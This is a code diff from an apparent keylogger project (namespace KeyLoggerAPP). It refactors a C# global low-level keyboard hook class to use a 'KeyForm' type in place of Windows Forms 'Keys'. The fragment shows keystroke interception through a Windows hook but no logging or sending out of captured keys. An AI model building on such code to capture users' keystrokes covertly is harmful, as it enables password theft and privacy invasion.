@@ -1,9 +1,9 @@
-﻿using System;
+﻿using Library;
+using System;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
-using System.Windows.Forms;
 
 namespace KeyLoggerAPP
 {
@@ -11,7 +11,7 @@ namespace KeyLoggerAPP
     {
         public event EventHandler<GlobalKeyboardHookEventArgs> KeyboardPressed;
 
-        public GlobalKeyboardHook(Keys[] registeredKeys = null)
+        public GlobalKeyboardHook(KeyForm[] registeredKeys = null)
         {
             RegisteredKeys = registeredKeys;
             _windowsHookHandle = IntPtr.Zero;
@@ -103,7 +103,7 @@ namespace KeyLoggerAPP
         {
             public int VirtualCode;
 
-            public Keys Key { get { return (Keys)VirtualCode; } }
+            public KeyForm Key { get { return (KeyForm)VirtualCode; } }
 
             public int HardwareScanCode;
 
@@ -124,7 +124,7 @@ namespace KeyLoggerAPP
             SysKeyUp = 0x0105
         }
 
-        public static Keys[] RegisteredKeys;
+        public static KeyForm[] RegisteredKeys;
         const int KfAltdown = 0x2000;
         public const int LlkhfAltdown = (KfAltdown >> 8);
 
@@ -140,7 +140,7 @@ namespace KeyLoggerAPP
 
                 var eventArguments = new GlobalKeyboardHookEventArgs(p, (KeyboardState)wparamTyped);
 
-                var key = (Keys)p.VirtualCode;
+                var key = (KeyForm)p.VirtualCode;
                 if (RegisteredKeys == null || RegisteredKeys.Contains(key))
                 {
                     EventHandler<GlobalKeyboardHookEventArgs> handler = KeyboardPressed;
